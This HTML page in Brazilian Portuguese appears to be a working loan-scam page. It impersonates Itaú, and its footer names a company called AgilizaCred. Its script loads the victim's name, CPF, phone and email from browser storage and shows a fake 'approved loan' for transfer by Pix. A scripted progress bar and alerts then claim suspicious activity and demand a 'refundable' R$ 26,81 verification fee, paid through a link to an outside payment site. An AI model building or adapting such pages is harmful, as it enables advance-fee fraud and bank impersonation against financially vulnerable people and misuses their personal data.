<!DOCTYPE html><html lang="pt-BR"><head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
   
    <title>Itaú — Confirmação de Empréstimo</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap');

        :root {
            --cred-primary: #ff6200;
            --cred-light: #ff6200;
            --cred-dark: #ff6200;
            --cred-accent: #111827;
            --bg: #F4F5F7;
            --text: #1f2937;
            --muted: #6b7280;
            --card: #ffffff;
            --border: #e5e7eb;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'DM Sans', Arial, Helvetica, sans-serif;
            background: var(--bg);
            color: var(--text);
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-height: 100vh;
            padding: 1rem;
        }

        .card,
        .loading,
        .card-final {
            padding: 1.5rem;
            max-width: 420px;
            width: 100%;
            display: none;
            flex-direction: column;
            gap: .75rem;
            margin: 0 auto;
            background: var(--card);
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.08);
        }

        .card.active,
        .loading.active,
        .card-final.active {
            display: flex;
        }

        /* ===== LOGO POR IMAGEM (HEADER E RODAPÉ) ===== */
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1rem;
        }

        .brand-logo{
            display:flex;
            align-items:center;
            justify-content:center;
            user-select:none;
            text-decoration:none;
            line-height:0;
        }

        /* Troque o arquivo aqui (ex: /images/logo.png ou /images/logo.svg) */
        .brand-logo img{
            width: 170px;      /* ajuste se quiser */
            height: auto;
            display:block;
        }

        /* Footer */
        .footer {
            margin-top: 2rem;
            text-align: center;
            padding: 1rem;
        }

        .footer .brand-logo img{
            width: 140px;      /* menor no rodapé */
            height:auto;
            display:block;
            margin:0 auto .5rem;
        }

        h2 {
            font-size: 1.35rem;
            font-weight: 700;
            color: var(--cred-accent);
            margin-bottom: .25rem;
        }

        .value {
            font-size: 2.2rem;
            font-weight: 800;
            color: var(--cred-primary);
            margin-bottom: .25rem;
        }

        .recipient {
            font-size: .98rem;
            color: #4b5563;
            margin-bottom: 1rem;
        }

        .recipient b { font-weight: 600; color: #111827; }

        .info-line {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: .95rem;
            margin-bottom: .6rem;
            color: #374151;
            padding: 0.5rem 0;
            border-bottom: 1px solid #f3f4f6;
        }

        .info-line:last-of-type { border-bottom: none; }

        .info-line span:last-child {
            font-weight: 600;
            color: #111827;
        }

        .box {
            margin-top: 1rem;
            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
            border: 1px solid #bbf7d0;
            border-radius: 12px;
            padding: 1rem;
            font-size: .95rem;
            color: var(--cred-accent);
            text-align: left;
            line-height: 1.5;
        }

        .box-icon {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--cred-primary);
        }

        .button,
        .final-button {
            display: block;
            margin-top: 1rem;
            width: 100%;
            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 1rem 1.5rem;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            transition: transform .06s ease, filter .2s ease, box-shadow .2s ease;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
        }

        .button:active,
        .final-button:active { transform: scale(0.98); }

        .button:hover,
        .final-button:hover {
            filter: brightness(1.05);
            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background-color: #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--cred-light) 0%, var(--cred-primary) 100%);
            transition: width .1s linear;
            border-radius: 8px;
        }

        .status-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: .75rem;
            color: var(--cred-primary);
            text-align: center;
        }

        .fade-out-up { opacity: 0; transform: translateY(-12px); transition: .3s ease; }
        .fade-in-up { opacity: 1; transform: translateY(0); transition: .3s ease; }

        .wrapper-final {
            background-color: #f0fdf4;
            padding: 1rem;
            border-radius: 1rem;
            display: grid;
            grid-template-rows: repeat(3, auto);
            gap: .6rem;
            min-height: 260px;
        }

        .alert-box {
            background: #fff;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 1rem;
            display: none;
            align-items: center;
            gap: .75rem;
            font-size: .95rem;
            color: #374151;
            opacity: 0;
            transform: translateY(10px);
            animation: fadeInUp .3s ease forwards;
        }

        .alert-box.strong {
            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
            border-color: #86efac;
            color: var(--cred-accent);
            font-weight: 600;
        }

        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }

        .icon-img { width: 2rem; height: 2rem; }

        .spinner {
            border: 3px solid #dcfce7;
            border-top: 3px solid var(--cred-primary);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin .7s linear infinite;
            margin: 12px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        @keyframes pulse-green {
            0% { box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3); }
            50% { box-shadow: 0 4px 25px rgba(34, 197, 94, 0.6); }
            100% { box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3); }
        }

        .pulse-green { animation: pulse-green 2s infinite; }

        /* Badge de segurança */
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 1rem;
            padding: 0.75rem;
            background: #f9fafb;
            border-radius: 8px;
            font-size: 0.85rem;
            color: #6b7280;
        }

        .security-badge svg {
            width: 16px;
            height: 16px;
            color: var(--cred-primary);
        }

        .footer small {
            font-size: 0.75rem;
            color: #9ca3af;
            line-height: 1.4;
        }

        /* Loading container styling */
        .loading { text-align: center; padding: 3rem 1.5rem; }

        .loading .spinner {
            width: 48px;
            height: 48px;
            border-width: 4px;
            margin-bottom: 1.5rem;
        }
    </style>
</head>

<body>
    <!-- CARD INICIAL -->
    <div class="card active" id="card">
        <div class="logo-container">
            <!-- ✅ LOGO POR IMAGEM -->
            <a class="brand-logo" href="#" aria-label="AgilizaCred">
                <img src="/images/itau2.png" alt="AgilizaCred">
            </a>
        </div>
        
        <h2><svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo Aprovado</h2>
        <div class="value" id="value">R$ 0,00</div>
        <div class="recipient">para <b id="nome-completo">Carregando...</b></div>
        
        <div class="info-line"><span>CPF</span><span id="cpf">xxx.xxx.xxx-xx</span></div>
        <div class="info-line"><span>Tipo de transferência</span><span>Pix</span></div>
        <div class="info-line"><span>Data</span><span id="data">--/--/----</span></div>
        
        <div class="box">
            <div class="box-icon">
                <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                Crédito Liberado
            </div>
            Seu valor está disponível para liberação imediata. Confira seus dados e prossiga para confirmar a transferência para sua chave Pix cadastrada.
        </div>
        
        <button class="button pulse-green" onclick="iniciarTransferencia()">
            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
            Confirmar transferência
        </button>
        
        <div class="security-badge">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
            </svg>
            Ambiente seguro e criptografado
        </div>
    </div>

    <!-- TELA DE CARREGAMENTO -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <h2 id="status-text" class="status-text">Processando...</h2>
        <div class="progress-bar">
            <div class="progress-bar-fill" id="bar"></div>
        </div>
    </div>

    <!-- CARD FINAL -->
    <div class="card-final" id="card-final">
        <div class="logo-container">
            <!-- ✅ LOGO POR IMAGEM -->
            <a class="brand-logo" href="#" aria-label="AgilizaCred">
                <img src="/images/logo.png" alt="AgilizaCred">
            </a>
        </div>
        
        <h2 style="font-size: 1.25rem; margin-bottom: .5rem;"><svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>Comprovante de solicitação</h2>
        <div class="wrapper-final"></div>
        <button class="final-button pulse-green" onclick="redirect()">Pagar Taxa de verificação</button>
        
        <div class="security-badge">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
            </svg>
            Transação protegida pela AgilizaCred
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <!-- ✅ LOGO POR IMAGEM NO RODAPÉ -->
        <a class="brand-logo" href="#" aria-label="AgilizaCred">
            <img src="/images/itau2.png" alt="AgilizaCred">
        </a>

        <br>
        <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
    </div>

    <script>
        // =============== UTIL ===============
        const LS = {
            read(k, fb = "") { try { const v = localStorage.getItem(k); return (v ?? "").toString().trim() || fb; } catch { return fb; } },
            readJSON(k, fb = {}) { try { const r = localStorage.getItem(k); if (!r) return fb; const o = JSON.parse(r); return (o && typeof o === "object") ? o : fb; } catch { return fb; } },
            write(k, v) { try { localStorage.setItem(k, String(v)); } catch { } },
            writeJSON(k, o) { try { localStorage.setItem(k, JSON.stringify(o || {})); } catch { } },
        };
        const firstNonEmpty = (...vals) => { for (const v of vals) { if (v == null) continue; const s = String(v).trim(); if (s) return s; } return ""; };
        const normalizeToNumber = v => {
            if (typeof v === "number" && Number.isFinite(v)) return v; if (!v) return 0;
            let s = String(v).replace(/\s+/g, ""); if (/,/.test(s) && /\./.test(s)) s = s.replace(/\./g, "").replace(",", "."); else if (/,/.test(s)) s = s.replace(",", ".");
            s = s.replace(/[^\d.-]/g, ""); const n = Number(s); return Number.isFinite(n) ? n : 0;
        };
        const formatBRL = n => { try { return n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }); } catch { return "R$ " + (Math.round(n * 100) / 100).toFixed(2).replace(".", ","); } };
        const formatCPF = cpf => { const c = String(cpf || "").replace(/\D/g, ""); return c.length === 11 ? c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "xxx.xxx.xxx-xx"; };

        // =============== STATE/HYDRATE ===============
        function hydrate() {
            const userData = LS.readJSON("userData");
            const dadosUsuario = LS.readJSON("dadosUsuario");
            const utmParams = LS.readJSON("utmParams");
            const checkoutData = LS.readJSON("checkoutData");

            const nome = firstNonEmpty(
                LS.read("nome"),
                LS.read("name"),
                LS.read("nomeUsuario"),
                userData.name,
                dadosUsuario.NOME,
                checkoutData.name,
                "Usuário"
            );

            const cpf = firstNonEmpty(
                LS.read("cpf"),
                LS.read("document"),
                LS.read("cpfUsuario"),
                userData.cpf,
                dadosUsuario.CPF,
                checkoutData.cpf
            );

            const telefone = firstNonEmpty(
                LS.read("telephone"),
                LS.read("phone"),
                LS.read("telefone"),
                dadosUsuario.TELEFONE,
                checkoutData.phone
            );

            const email = firstNonEmpty(
                LS.read("email"),
                dadosUsuario.EMAIL,
                dadosUsuario["E-MAIL"],
                dadosUsuario.E_MAIL,
                userData.email,
                checkoutData.email
            );

            const credito = firstNonEmpty(
                LS.read("selectedLoanAmount"),
                LS.read("creditoSolicitado"),
                LS.read("valorEmprestimo"),
                LS.read("valorAprovado"),
                checkoutData.valor,
                LS.read("valor")
            );
            const creditoNumber = normalizeToNumber(credito);
            const valorFormatado = creditoNumber > 0 ? formatBRL(creditoNumber) : "R$ 0,00";

            const $nome = document.getElementById("nome-completo");
            const $valor = document.getElementById("value");
            const $cpf = document.getElementById("cpf");
            const $data = document.getElementById("data");

            if ($nome) $nome.textContent = nome || "Usuário";
            if ($valor) $valor.textContent = valorFormatado;
            if ($cpf) $cpf.textContent = cpf ? formatCPF(cpf) : "xxx.xxx.xxx-xx";
            if ($data) {
                const d = new Date();
                $data.textContent = `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
            }

            if (nome) LS.write("name", nome);
            if (cpf) LS.write("document", cpf);
            if (telefone) LS.write("telephone", telefone);
            if (email) LS.write("email", email);
            if (credito) LS.write("creditoSolicitado", creditoNumber || credito);

            console.info("[AGILIZACRED] hydrate()", {
                origin: location.origin,
                length: (() => { try { return localStorage.length } catch { return "blocked"; } })(),
                nome, cpf, telefone, email, credito: creditoNumber, utmParams
            });
        }

        window.iniciarTransferencia = function () {
            document.getElementById("card")?.classList.remove("active");
            document.getElementById("loading")?.classList.add("active");
            const bar = document.getElementById("bar");
            const statusText = document.getElementById("status-text");
            let progress = 0, trocado = false;
            const it = setInterval(() => {
                if (progress >= 100) {
                    clearInterval(it);
                    document.getElementById("loading")?.classList.remove("active");
                    document.getElementById("card-final")?.classList.add("active");
                    exibirAlertasComSpinner();
                } else {
                    progress++;
                    if (bar) bar.style.width = progress + "%";
                    if (progress === 70 && !trocado && statusText) {
                        trocado = true;
                        statusText.classList.add("fade-out-up");
                        setTimeout(() => {
                            statusText.textContent = "Finalizando...";
                            statusText.classList.remove("fade-out-up");
                            statusText.classList.add("fade-in-up");
                        }, 300);
                    }
                }
            }, 30);
        };

        window.redirect = function () {
            const checkoutParams = new URLSearchParams(window.location.search);
            window.location.href = `https://pay.acesso-segurovf.site/DPXw3Xn0l8kGzmp?${checkoutParams.toString()}`;
        };

        document.addEventListener("DOMContentLoaded", hydrate);
        window.addEventListener("load", () => { try { hydrate(); } catch (e) { console.warn("hydrate@load", e); } });
    </script>
    
    <script>
  function escapeHTML(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function nl2brSafe(str) {
    return escapeHTML(str).replace(/\n/g, "<br>");
  }

  function exibirAlertasComSpinner() {
    const wrapper = document.querySelector(".wrapper-final");
    if (!wrapper) return;
    wrapper.innerHTML = "";

    const alerts = [
      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Identificamos uma movimentação de valor alto suspeita!" },
      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes." },
      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", strong: true }
    ];

    let index = 0;

    function showNext() {
      if (index >= alerts.length) return;

      const spinner = document.createElement("div");
      spinner.className = "spinner";
      wrapper.appendChild(spinner);

      setTimeout(() => {
        spinner.remove();

        const a = alerts[index];
        const box = document.createElement("div");
        box.className = "alert-box" + (a.strong ? " strong" : "");

        const icon = document.createElement("img");
        icon.className = "icon-img";
        icon.alt = "Info";
        icon.src = a.icon;

        const txt = document.createElement("div");
        txt.innerHTML = nl2brSafe(a.text);

        box.appendChild(icon);
        box.appendChild(txt);

        box.style.display = "flex";
        wrapper.appendChild(box);

        index++;
        setTimeout(showNext, 900);
      }, 700);
    }

    showNext();
  }
</script>

    <script src="js/upsells.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            initUpsell(1);
        });
    </script>

</body></html>
